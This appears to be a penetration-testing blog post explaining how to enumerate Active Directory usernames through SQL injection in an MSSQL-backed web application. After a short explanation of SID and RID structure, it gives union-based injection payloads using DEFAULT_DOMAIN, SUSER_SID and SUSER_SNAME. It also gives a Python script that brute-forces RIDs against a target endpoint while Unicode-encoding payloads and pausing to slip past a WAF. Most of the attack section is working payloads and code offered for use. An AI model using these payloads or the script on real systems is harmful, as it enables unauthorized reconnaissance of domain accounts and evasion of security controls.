[back](/)

### Username enumeration via SQL injection

Each account or group in the Active Directory has its own security identifier or (SID), which also includes a relative identifier (RID).

What are they needed for ? Windows operating system differentiates the rights in the Active Directory domain of a particular user, thanks to these identifiers, this is extremely important.

![Image](/img/username_enum-from-sqli/3.png)

Imagine that you are migrating from one domain to another, for example from **source.local** to **destination.local**, then the user's SID and RID will be changed. How exactly to preserve the rights of the user who is associated with security groups and a specific SID/RID ?

Naturally it will be changed during domain migration. The fact is that the access token is generated based on all previously created identifiers, including those that were previously assigned to the user. This is how the user's access token to objects is formed.

The SID/RID consists of several components shown in the diagram:

![Image](/img/username_enum-from-sqli/5.jpg)

To find out the SID in a specific domain it is enough to execute the DEFAULT_DOMAIN () MSSQL query, and than using the resulting identifier mask, you can enumerate usernames. Given this access model there is an interesting opportunity for an attacker who found an injection in the MSSQL database.

```
123' union select 1,2,3,4, DEFAULT_DOMAIN() as mydomain -- 1
```

![Image](/img/username_enum-from-sqli/11.png)

Using the SUSER_SID and SUSER_SNAME queries, it is possible to enumerate usernames in the domain:

```
123' union select 1,2,3,4,(select (select stuff(upper(sys.fn_varbintohexstr((SELECT SUSER_SID('YOURDOMAIN\Domain Admins')))), 1, 2, ''))) -- 1
123' union select 1,2,3,4,SUSER_SNAME(0x0105000000000005150000001C00D1BCD181F1492BDFC236F4010000) -- 1
```

![Image](/img/username_enum-from-sqli/6.png)

![Image](/img/username_enum-from-sqli/7.png)

Knowing the structure of the SID and the process of generating RID, you can select 8 bytes related to RID and get a list of usernames in the AD. I wrote a small script to help you to do this. It contains WAF bypass elements associated with the waiting time. It also converts each payload character to Unicode, which indicates a non-standard injection:

```
#!/usr/bin/python3

import requests
import time
from requests.exceptions import HTTPError
from termcolor import colored

def convert_to_unicode(char):
 code = hex(ord(str(char)))[2:]
 prefix = "0" * (4 - len(code))
 return f'\\u{prefix}{code}'

def sqli_post(rid):
 val = "123' union select 1,2,3,4,SUSER_SNAME(0x0105000000000005150000001C00D1BCD181F1492BDFC236"+r+") -- 1"
 res = ""
 for el in val:
  res += convert_to_unicode(el)
 response = requests.post(url, data='{"name":"'+res+'"}', headers = {"Content-Type":"application/json;charset=utf-8"})
 if "403 - Forbidden: Access is denied." in response.text:
  print(colored("[-] Sleeping and WAF cooldown", "red"))
  time.sleep(60)
 if "\\" in response.text:   
  print(colored("[+]"+response.text+"\r\nRID: "+r,"green"))

for url in ['http://10.10.10.10/api/getSOMETHING']:
 try:
  for i in range(500,4000):
   q = hex(i)[2:]
   w = q[1:]
   e = w+"0"+q[:1]
   r = e+"0"*(8-len(e))
   sqli_post(r)

  for i in range(6001,6010):
   q = hex(i)[2:]
   w = q[2:]
   e = q[:2]
   r = w+e+"0"*(8-len(q))
   sqli_post(r)

 except HTTPError as http_err:
  print(f'HTTP error occurred: {http_err}')
 except Exception as err:
  print(f'Other error occurred: {err}')
 else:
  
  print('Success!\r\n')
```

The result will please you =)

![Image](/img/username_enum-from-sqli/12.png)

![Image](/img/username_enum-from-sqli/2.png)

To get a positive enumeration result, start with a sequential enumeration using these queries:

```
123' union select 1,2,3,4,5 -- 1
123' union select 1,2,3,4,@@version -- 1
123' union select 1,2,3,4, DEFAULT_DOMAIN() as mydomain -- 1
123' union select 1,2,3,4,(select (select stuff(upper(sys.fn_varbintohexstr((SELECT SUSER_SID('YOURDOMAIN\Domain Admins')))), 1, 2, ''))) -- 1
```

For detailed information about the RID pool, you can use the following command:

```
dcdiag / test: ridmanager / v
```

![Image](/img/username_enum-from-sqli/9.png)

It will show the current status of the RID pool, the maximum possible pool, and the next RID that will be assigned to the domain user.

This method is especially effective if you do not have access to the remote call procedure through the **rpcclient** as well as a valid account in the domain:

![Image](/img/username_enum-from-sqli/10.png)

These articles will help you explore the issue in more detail:

+ [enumerating-domain-accounts](https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)
+ [how-to-check-the-rid-pool-in-active-directory](https://www.windowstechno.com/how-to-check-the-rid-pool-in-active-directory/)
+ [varbinary-to-literal-varchar-copy-in-sql-server-2005](https://stackoverflow.com/questions/6424328/varbinary-to-literal-varchar-copy-in-sql-server-2005)

<div id="disqus_thread"></div>
<script>
(function() { // DON'T EDIT BELOW THIS LINE
var d = document, s = d.createElement('script');
s.src = 'https://hackitfaster-hopto-org.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

[back](/)



